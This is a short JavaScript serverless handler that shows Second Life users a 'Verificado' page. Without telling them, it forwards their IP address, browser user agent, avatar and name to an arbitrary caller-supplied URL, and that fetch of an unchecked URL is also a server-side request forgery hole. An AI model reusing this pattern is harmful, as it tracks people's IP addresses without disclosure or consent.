export default async function handler(req, res) {
  const avatar = req.query.avatar || "";
  const nome = req.query.nome || "";
  const primurl = req.query.primurl || "";

  const forwarded = req.headers["x-forwarded-for"] || "";
  const ip =
    forwarded.split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "desconhecido";

  const navegador = req.headers["user-agent"] || "desconhecido";

  if (primurl) {
    const retorno =
      primurl +
      "?acao=retorno" +
      "&avatar=" + encodeURIComponent(avatar) +
      "&nome=" + encodeURIComponent(nome) +
      "&ip=" + encodeURIComponent(ip) +
      "&navegador=" + encodeURIComponent(navegador);

    try {
      await fetch(retorno);
    } catch (e) {}
  }

  res.setHeader("Content-Type", "text/html; charset=utf-8");

  res.end(`
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Verificado</title>
</head>
<body style="margin:0;min-height:100vh;background:#08111f;color:white;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;text-align:center;">
  <div>
    <h1>✅ Verificado</h1>
    <p>Você já pode voltar ao Second Life.</p>
  </div>
</body>
</html>
  `);
}
